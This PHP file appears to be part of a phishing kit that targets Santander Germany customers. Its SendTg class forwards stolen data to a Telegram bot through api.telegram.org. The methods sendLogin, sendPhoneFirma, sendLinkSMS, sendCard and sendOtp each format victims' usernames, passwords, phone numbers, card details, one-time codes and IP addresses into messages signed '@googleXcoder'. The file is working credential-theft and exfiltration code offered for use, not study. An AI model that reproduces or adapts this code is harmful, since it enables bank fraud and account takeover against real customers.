<?php
class SendTg {
    protected $bot_token;
    protected $chat_id;

    function __construct($bot_token, $chat_id)
    {
        $this->bot_token = $bot_token;
        $this->chat_id = $chat_id;
    }

    public function send($msg) {
        $apiToken = $this->bot_token;
        $data = [
            'chat_id' => $this->chat_id,
            'text' => $msg
        ];
        $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
    }



    public function sendLogin($user, $pass, $ip, $uag) {
        $msg    = "╭🏦 SANTADER.DE LOGIN";
        $msg .= "\n┣🟢 USER : ".$user;
        $msg .= "\n┣🟢 PASS : ".$pass;
        $msg .= "\n┣🟢 FROM : ".$_SERVER['HTTP_REFERER'];
        $msg .= "\n┣🟢 IP : ".$ip;
        $msg .= "\n╰🏦 @googleXcoder";
        $this->send($msg);
    }

    public function sendPhoneFirma($user, $pass, $phone, $ip, $uag) {
        $msg    = "╭🏦 SANTADER.DE LOG + PHONE";
        $msg .= "\n┣🟢 USER : ".$user;
        $msg .= "\n┣🟢 PASS : ".$pass;
        $msg .= "\n┣🟢 PHONE : ".$phone;
        $msg .= "\n┣🟢 FROM : ".$_SERVER['HTTP_REFERER'];
        $msg .= "\n┣🟢 IP : ".$ip;
        $msg .= "\n╰🏦 @googleXcoder";
        $this->send($msg);
    }
    public function sendLinkSMS($user, $pass, $linksms, $ip, $uag) {
        $msg    = "╭🏦 SANTADER.DE LOG + LINK";
        $msg .= "\n┣🟢 USER : ".$user;
        $msg .= "\n┣🟢 PASS : ".$pass;
        $msg .= "\n┣🟢 LINK : ".$linksms;
        $msg .= "\n┣🟢 IP : ".$ip;
        $msg .= "\n┣🟢 FROM : ".$_SERVER['HTTP_REFERER'];
        $msg .= "\n╰🏦 @googleXcoder";
        $this->send($msg);
    }

    public function sendCard($user, $pass, $phone, $firma, $cards, $ip, $uag) {
        $msg    = "╭🏦 SANTADER.DE CARDS";
        $msg .= "\n┣🟢 USER : ".$user;
        $msg .= "\n┣🟢 CARDS : ".$cards;
        $msg .= "\n┣🟢 FROM : ".$_SERVER['HTTP_REFERER'];
        $msg .= "\n╰🏦 @googleXcoder";
        $this->send($msg);
    }

    public function sendOtp($user, $otp) {
        $msg    = "╭🏦 SANTADER.DE OTP";
        $msg .= "\n┣🟢 USER : ".$user;
        $msg .= "\n┣🟢 OTP : ".$otp;
        $msg .= "\n┣🟢 FROM : ".$_SERVER['HTTP_REFERER'];
        $msg .= "\n╰🏦 @googleXcoder";
        $this->send($msg);
    }
}